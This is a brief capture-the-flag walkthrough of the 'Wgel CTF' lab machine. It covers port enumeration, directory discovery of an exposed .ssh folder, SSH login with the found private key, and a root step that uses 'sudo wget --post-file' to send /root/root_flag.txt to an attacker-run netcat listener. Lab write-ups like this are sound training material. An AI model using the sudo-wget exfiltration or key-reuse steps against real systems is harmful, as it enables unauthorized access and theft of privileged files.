# Wgel CTF
```

export IP =  10.10.92.1

[Port]
22 ssh
80 http
-- /index.html 
-- /sitemap

[Reconissance]

1. index.html
-- username : Jessie

2. sitemap
-- dirsearch & gobuster 
-- --  Hidden Directoy : .ssh

[[Credential] - SSH ]
1. ssh2john.py id_rsa > hash
: id_rsa has no password!

2. chmod 600 id_rsa
3. ssh -i id_rsa jessie@export_ip

[Flag]
1. user.txt
-- find / -name "*user*" 2>/dev/null


[Root Flag]
1. sudo -l
2. sudo wget --post-file=/root/root_flag.txt 10.9.26.67:1234
3. MyPc Setup NC
-- : nc -l 1234 


```